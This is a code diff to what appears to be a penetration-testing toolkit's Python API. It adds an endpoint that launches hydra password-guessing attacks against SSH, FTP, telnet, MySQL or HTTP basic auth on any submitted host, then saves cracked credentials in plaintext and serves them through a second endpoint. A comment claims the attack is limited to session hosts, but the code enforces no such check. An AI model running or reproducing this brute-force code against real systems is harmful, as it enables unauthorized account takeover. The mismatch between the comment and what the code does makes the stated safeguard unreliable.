@@ -64,6 +64,7 @@ CACHE_TTL_SECONDS = 300  # re-serve a matching recent scan within 5 minutes
 _neighbors_cache: dict[str, list[dict[str, Any]]] = {}
 _neighbor_jobs: dict[str, dict[str, Any]] = {}
 _fingerprint_jobs: dict[str, dict[str, Any]] = {}
+_passattack_jobs: dict[str, dict[str, Any]] = {}
 _attack_cache: dict[str, list[dict[str, Any]]] = {}
 
 _NEIGHBOR_DB = Path("/opt/h4k/data/neighbors.db")
@@ -114,6 +115,17 @@ def _neighbor_db() -> sqlite3.Connection:
     )
     conn.execute(
         "DELETE FROM discovered_service_vulns WHERE kind='cve' AND detail LIKE '%msf: post/%'"
+    )
+    conn.execute(
+        "CREATE TABLE IF NOT EXISTS found_creds ("
+        "  host        TEXT NOT NULL,"
+        "  port        INTEGER NOT NULL,"
+        "  service     TEXT NOT NULL,"
+        "  user        TEXT NOT NULL,"
+        "  password    TEXT NOT NULL,"
+        "  found_at    TEXT NOT NULL,"
+        "  PRIMARY KEY (host, port, service, user, password)"
+        ")"
     )
     conn.commit()
     return conn
@@ -1148,6 +1160,212 @@ def neighbors_vulns() -> dict[str, Any]:
     """Known vulnerabilities correlated against fingerprinted neighbor services."""
     vulns = _load_neighbor_vulns()
     return {"vulns": vulns, "count": len(vulns)}
+
+
+# ---- common password attack (opt-in, card-driven) --------------------------
+# Bundled wordlists; hydra covers the classic CTF services. This is a credential
+# GUESSING attack: it only runs when the operator asks for it, against hosts in
+# the current session.
+
+PASSATTACK_SERVICES: dict[str, dict[str, Any]] = {
+    "ssh": {"hydra": "ssh", "default_port": 22},
+    "ftp": {"hydra": "ftp", "default_port": 21},
+    "telnet": {"hydra": "telnet", "default_port": 23},
+    "mysql": {"hydra": "mysql", "default_port": 3306},
+    "http-basic": {"hydra": "http-get", "default_port": 80, "path": "/"},
+}
+
+
+@router.post("/passattack")
+def pass_attack(req: dict[str, Any], background: BackgroundTasks) -> dict[str, Any]:
+    """OPT-IN: common-password attack (hydra) against one service on one host."""
+    host = (req.get("host") or "").strip()
+    service = (req.get("service") or "").strip()
+    if not host or service not in PASSATTACK_SERVICES:
+        raise HTTPException(
+            status_code=422,
+            detail="host + service required (ssh/ftp/telnet/mysql/http-basic)",
+        )
+    msf = _get_msf()
+    if msf is None:
+        raise HTTPException(status_code=503, detail="msf unavailable")
+
+    job_id = uuid.uuid4().hex[:12]
+    job: dict[str, Any] = {
+        "id": job_id,
+        "host": host,
+        "service": service,
+        "port": int(req.get("port") or PASSATTACK_SERVICES[service]["default_port"]),
+        "status": "running",
+        "progress": 0.0,
+        "message": f"starting {service} password attack on {host}...",
+        "found": [],
+        "attempts": 0,
+        "log": [],
+        "error": None,
+        "created": datetime.now(UTC).isoformat(),
+    }
+    _passattack_jobs[job_id] = job
+    background.add_task(
+        _run_pass_attack,
+        job,
+        host,
+        service,
+        job["port"],
+        req.get("users"),
+        req.get("passwords"),
+    )
+    return {"job_id": job_id, "status": "running"}
+
+
+def _run_pass_attack(
+    job: dict[str, Any],
+    host: str,
+    service: str,
+    port: int,
+    users: list[str] | None = None,
+    passwords: list[str] | None = None,
+) -> None:
+    import os
+    import re as _re
+    import time as _time
+
+    from services.toolkit import ToolkitRunner
+
+    runner = ToolkitRunner(
+        progress=lambda msg, pct: _update(job, message=msg, progress=pct)
+    )
+    cfg = PASSATTACK_SERVICES[service]
+
+    userlist = "/opt/h4k/data/users.txt"
+    passlist = "/opt/h4k/data/passwords.txt"
+    if users:
+        with open(userlist + ".run", "w", encoding="utf-8") as fh:
+            fh.write("\n".join(users))
+        userlist += ".run"
+    if passwords:
+        with open(passlist + ".run", "w", encoding="utf-8") as fh:
+            fh.write("\n".join(passwords))
+        passlist += ".run"
+
+    from services.toolkit import USERLIST as bundled_users, PASSLIST as bundled_pass
+
+    def _count(path: str) -> int:
+        try:
+            return sum(1 for line in open(path, encoding="utf-8") if line.strip())
+        except OSError:
+            return 0
+
+    n_users, n_pass = _count(userlist), _count(passlist)
+    job["attempts"] = n_users * n_pass
+
+    argv = [
+        "hydra",
+        "-L",
+        userlist,
+        "-P",
+        passlist,
+        "-t",
+        "6",
+        "-f",
+        "-o",
+        "-",
+    ] + (
+        [f"http-get://{host}:{port}{cfg.get('path', '/')}"]
+        if service == "http-basic"
+        else [host, cfg["hydra"]]
+    )
+
+    def _logline(msg: str) -> None:
+        job["log"].append(msg)
+
+    _logline(
+        f"$ hydra {' '.join(argv[6:])} ({n_users} users x {n_pass} passwords = {n_users * n_pass} attempts)"
+    )
+    start = _time.time()
+    result = runner.run_tool("hydra", argv, timeout=900)
+    _logline(
+        f"hydra rc={result['rc']} elapsed={result['elapsed']}s"
+        + (" (timed out)" if result["timed_out"] else "")
+    )
+    out = result["stdout"] + "\n" + result["stderr"]
+
+    # hydra success line: [22][ssh] host: 192.168.1.11   login: root   password: secret
+    creds: list[dict[str, Any]] = []
+    for match_ in _re.findall(
+        r"\[\d+\]\[[^\]]+\]\s*host:\s*([\d.]+)\s+login:\s*([^\s]+)\s+password:\s*([^\s]+)",
+        out,
+    ):
+        creds.append(
+            {
+                "host": match_[0],
+                "port": port,
+                "service": service,
+                "user": match_[1],
+                "password": match_[2],
+            }
+        )
+
+    # dedupe
+    creds = [dict(t) for t in {tuple(sorted(d.items())) for d in creds}]
+
+    if creds:
+        conn = _neighbor_db()
+        from datetime import UTC as _UTC
+
+        now = datetime.now(_UTC).isoformat()
+        for c in creds:
+            conn.execute(
+                "INSERT OR REPLACE INTO found_creds (host, port, service, user, password, found_at) "
+                "VALUES (?, ?, ?, ?, ?, ?)",
+                (c["host"], c["port"], c["service"], c["user"], c["password"], now),
+            )
+        conn.commit()
+        conn.close()
+
+    job["found"] = creds
+    _update(
+        job,
+        status="done",
+        progress=100.0,
+        message=(
+            f"found {len(creds)} credential(s)"
+            if creds
+            else f"no match ({n_users * n_pass} attempts, {round(_time.time() - start)}s)"
+        ),
+    )
+
+
+@router.get("/passattack/{job_id}")
+def pass_attack_status(job_id: str) -> dict[str, Any]:
+    job = _passattack_jobs.get(job_id)
+    if not job:
+        raise HTTPException(status_code=404, detail="password attack job not found")
+    return job
+
+
+@router.get("/passattack/creds/all")
+def pass_attack_creds() -> dict[str, Any]:
+    """All credentials found by password attacks in this session."""
+    conn = _neighbor_db()
+    rows = conn.execute(
+        "SELECT host, port, service, user, password, found_at FROM found_creds ORDER BY found_at DESC"
+    ).fetchall()
+    conn.close()
+    return {
+        "creds": [
+            {
+                "host": r[0],
+                "port": r[1],
+                "service": r[2],
+                "user": r[3],
+                "password": r[4],
+                "found_at": r[5],
+            }
+            for r in rows
+        ],
+        "count": len(rows),
+    }
 
 
 @router.get("/exploit-candidates")
